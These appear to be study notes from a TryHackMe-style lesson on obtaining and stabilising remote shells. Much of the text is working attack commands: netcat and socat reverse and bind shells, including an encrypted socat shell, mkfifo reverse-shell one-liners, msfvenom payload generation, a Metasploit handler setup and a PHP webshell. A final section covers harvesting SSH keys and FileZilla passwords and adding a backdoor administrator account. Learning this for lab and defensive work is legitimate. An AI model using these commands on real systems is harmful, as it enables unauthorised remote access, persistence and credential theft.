# Shells

* [What is a shell?](#What-is-a-shell?)
* [Shell Computing Tools](#Shell-Computing-Tools)
* [Types of Shells](#Types-of-Shells)
* [Running Netcat Shells](#Running-Netcat-Shells)
* [Netcat Shell Stabilization](#Netcat-Shell-Stabilization)
* [Running Socat Shells](#Running-Socat-Shells)
* [Socat Encrypted Shells](#Socat-Encrypted-Shells)
* [Common Shell Payloads](#Common-Shell-Payloads)
* [Msfvenom](#Msfvenom)
* [Metasploit multi/handler](#Metasploit-multi/handler)
* [Webshells](#Webshells)
* [Next Steps](#Next-Steps)


## What is a shell?

A shell is what we use when interfacing with a Command Line Environment. One can obtain access to a shell from an application running on the server to execute arbitrary code in that application's shell.

Reverse shell: forcing remote server to send us command line access to the server
Bind shell: opening up a port on the server which we can connect to in order to execute further commands

## Shell Computing Tools

Netcat: traditional "Swiss Army Knife" of networking
- Can be used to receive reverse shells
- Can connect to remote ports attached to bind shells on a target system
- Very unstable but can be improved by stabilization techniques
- Installed on Linux by default

Socat: Netcat on steroids
- Shells are usually more stable than netcat shells
- Syntax is more difficult
- Rarely installed on Linux by default

Metasploit: `auxiliary/multi/handler` module used to receive reverse shells
- Provides fully-fledged way to obtain stable shells
- Only way to interact with a *meterpreter* shell and easiest way to handle *staged* payloads

Msfvenom: Used to generate payloads on the fly
- Technically part of Metasplot Framework but shipped as a standalone tool

## Types of Shells

Reverse shells:
- When the target is forced to execute code that connects back to your computer
- You set up a *listener* for computer to receive connection
- Benefit that don't have to bypass firewall to connect to port
- Drawback that need to configure own network to accept shell when receiving a shell from a machine across the internet

Bind shells:
- Code executed on target is used to start a listener attached to a shell directly on the target
- Would then connect to port via internet to obtain remote code execution
- Doesn't require setup on your own network
- May be prevented by firewalls protecting target

### How to Run Reverse Shells

On the attacking machine: `sudo nc -lvnp 443`

On the target: `nc <LOCAL-IP> <PORT> -e /bin/bash`

### How to Run Bind Shells

On the target, want to get a port and tell it to execute `cmd.exe`: `nc -lvnp <port> -e "cmd.exe"`

On the attacking machine: `nc MACHINE_IP <port>`

# Running Netcat Shells

Syntax for starting a netcat listener for a **reverse shell** using Linux: 'nc -lvnp <port-number>'

**Note:** Will need to use 'sudo' when starting listener if port number is below 1024

Syntax to obtain a **bind shell** on a target: 'nc <target-ip> <chosen-port>'

# Netcat Shell Stabilization

Netcat shells are very unstable without techniques used to stabilize them.

### Technique 1: Python

1. Use Python to spawn a better bash shell using `python -c 'import pty;pty.spawn("/bin/bash")'`
2. Use `export TERM=xterm` to get access to term commands i.e. 'clear'
3. Turn off the terminal and foreground the shell using `stty raw -echo; fg`

### Technique 2: rlwrap

1. Install rlwrap using `sudo apt install rlwrap`
2. Invoke the rlwrap listener using `rlwrap nc -lvnp <port>`
3. If using Linux, complete the stabilization by using `stty raw -echo; fg`

### Technique 3: Initial netcat shell as a stepping stone into socat shell

1. Transfer socat static compiled binary to target machine using `sudo python3 -m http.server 80`
2. Use netcat shell to download the compiled binary file, using `wget <LOCAL-IP>/socat -O /tmp/socat` on Linux or `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`

### How to change terminal size

1. Open another terminal and run `stty -a` and note the values shown for numbers of rows and columns
2. Type `stty rows <number>` and `stty cols <number>` in reverse terminal to change width/height of terminal

## Running Socat Shells

Socat is the **connector between two points, which could be either a listening port and the keyboard, the listening port and a file, or two listening ports.**

### Reverse shells

Basic reverse shell listener in ‘socat’: ```socat TCP-L:<port> -```
Connecting reverse listener back back:
Linux: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`
Windows: `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes`

### Fully stable Linux tty reverse shell

Setting up listener: `socat TCP-L:<port> FILE:`tty`,raw,echo=0`
Connecting back to listener: `socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### Bind shells

Linux code to start a listener: `socat TCP-L:<PORT> EXEC:"bash -li"`
Windows code to start a listener: `socat TCP-L:<PORT> EXEC:powershell.exe,pipes`

Code to connect to listener via port: `socat TCP:<TARGET-IP>:<TARGET-PORT> -`


## Socat Encrypted Shells

- Socat is able to create encrypted shells of both binded and reverse
- Syntax for encrypted shells uses OPENSSL in place of TCP


- Certificate must be generated to use encrypted shells
- Certificate must be used with listener


- Example code to create certificate:
`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
- After creating certificate must merge certificate and file into pem file:
`cat shell.key shell.crt > shell.pem`
- Then to set up reverse shell listener: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
- This makes it so no verification needed
- Then connect back:
`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
- Bind shell uses same exact technique


- Target: `socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`
- Attacker: `socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0`


## Common Shell Payloads

To use netcat as a listener for a bindshell (Windows): `nc -lvnp <PORT> -e /bin/bash`
To use netcat as a listener for a bindshell (Linux): `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
To send a netcat reverse shell: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`


## Msfvenom

Standard syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`


`<OPTIONS>` to specify:
- f <format>
  - Specifies the output format. In this case that is an executable (exe)
- o <file>
  - The output location and filename for the generated payload.
- LHOST=<IP>
  - Specifies the IP to connect back to. When using TryHackMe, this will be your tun0 IP address. If you cannot load the link then you are not connected to the VPN.
- LPORT=<port>
  - The port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ports below 1024 are restricted and require a listener running with root privileges.


Example: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`

Basic convention for payload naming: `<OS>/<arch>/<payload>`
Linux example: `linux/x86/shell_reverse_tcp`
Windows example: `windows/shell_reverse_tcp`

Stageless payloads are denoted with underscores whereas staged payloads are denoted with forward slashes
Stageless payload: `shell_reverse_tcp`
Staged payload: `shell/reverse_tcp`

Can use `msfvenom --list payloads` to list all available payloads and then use `grep` to search for a specific set of payloads


## Metasploit multi/handler

- Multi/handler
  - Tool for catching reverse shells
  - Essential for meterpreter shells
  - Go-to for staged payloads
- How to use
  - Open Metasploit with:
    - Msfconsole
  - Then type code below and hit enter
    - use multi/handler
- Look at available options:
  - Options
- Options needed to set are
  - Payload
    - `set PAYLOAD <payload>`
  - LHOST
    - `set LHOST <listen-address>`
  - LPORT
    - `set LPORT <listen-port>``
- How to launch module(running in background)
  - Exploit -j
- To foreground multi/handler
  - Sessions 1
  - IF multiple sessions used
    - `sessions`
      - To show active sessions
        -  `sessions <number>`


## Webshells
- Used when uploading a script that activates a reverse or bind shell is impossible
- PHP is the most commonly used language
- A basic command: ``<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>``
- This means any commands we list after “?cmd=” will be executed
- This is used to run commands written into the URL of a shell
- Lots of webshells available on Kali

## Next Steps

Next step after have connected to system using shell, want to gain further, less unstable connection by finding credentials such as ssh keys or passwords or adding your account to their system

Looking for possible SSH keys on Linux: `/home/<user>/.ssh`
Looking for passwords on Windows: `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`

Syntax to log in on Windows:
`net user <username> <password> /add`
`net localgroup administrators <username> /add`
